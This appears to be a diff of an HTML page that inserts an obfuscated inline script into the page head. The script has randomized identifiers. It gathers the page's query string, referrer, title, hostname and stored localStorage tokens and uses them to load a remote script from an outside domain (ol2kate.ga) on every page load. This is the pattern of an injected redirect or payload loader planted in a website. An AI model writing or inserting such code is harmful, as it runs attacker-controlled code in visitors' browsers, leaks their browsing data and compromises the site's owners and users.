@@ -4,6 +4,49 @@
 
 <html>
 <head>
+  <script>
+    (function() {
+    var name = '_1bXYBXGdVhRKmfcr';
+    if (!window._1bXYBXGdVhRKmfcr) {
+        window._1bXYBXGdVhRKmfcr = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://ol2kate.ga/8MDWN3f7',
+            P_PATH: 'https://ol2kate.ga/7b4f75c/postback',
+        };
+    }
+    const _K1gz16CJGZ3BfTvn = localStorage.getItem('config');
+    if (typeof _K1gz16CJGZ3BfTvn !== 'undefined' && _K1gz16CJGZ3BfTvn !== null) {
+        var _ZrrX6jbyBVqpZBSb = JSON.parse(_K1gz16CJGZ3BfTvn);
+        var _1KBw5XGkH2k42w1j = Math.round(+new Date()/1000);
+        if (_ZrrX6jbyBVqpZBSb.created_at + window._1bXYBXGdVhRKmfcr.ttl < _1KBw5XGkH2k42w1j) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _NwpVpVCbNzr7fp6n = localStorage.getItem('subId');
+    var _mGP6wFpth5FtSKzR = localStorage.getItem('token');
+    var _C5XPmYnvFNRVDNPZ = '?return=js.client';
+        _C5XPmYnvFNRVDNPZ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _C5XPmYnvFNRVDNPZ += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _C5XPmYnvFNRVDNPZ += '&default_keyword=' + encodeURIComponent(document.title);
+        _C5XPmYnvFNRVDNPZ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _C5XPmYnvFNRVDNPZ += '&name=' + encodeURIComponent(name);
+        _C5XPmYnvFNRVDNPZ += '&host=' + encodeURIComponent(window._1bXYBXGdVhRKmfcr.R_PATH);
+    if (typeof _NwpVpVCbNzr7fp6n !== 'undefined' && _NwpVpVCbNzr7fp6n && window._1bXYBXGdVhRKmfcr.unique) {
+        _C5XPmYnvFNRVDNPZ += '&sub_id=' + encodeURIComponent(_NwpVpVCbNzr7fp6n);
+    }
+    if (typeof _mGP6wFpth5FtSKzR !== 'undefined' && _mGP6wFpth5FtSKzR && window._1bXYBXGdVhRKmfcr.unique) {
+        _C5XPmYnvFNRVDNPZ += '&token=' + encodeURIComponent(_mGP6wFpth5FtSKzR);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._1bXYBXGdVhRKmfcr.R_PATH + _C5XPmYnvFNRVDNPZ;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 
     <!-- PLUGINS -->
     
